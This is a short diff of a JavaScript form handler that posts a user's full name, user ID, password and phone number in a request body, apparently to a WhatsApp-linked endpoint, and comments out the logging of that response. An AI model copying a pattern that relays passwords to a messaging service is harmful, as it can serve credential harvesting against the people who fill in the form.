@@ -150,7 +150,7 @@ document.addEventListener('DOMContentLoaded', function () {
       body: JSON.stringify({ fullname, user_id, password, phone })
     })
       .then(response => response.json())
-      .then(data => console.log('WhatsApp Response:', data))
+     // .then(data => console.log('WhatsApp Response:', data))
       .catch(error => console.error('Error:', error));
   }
 
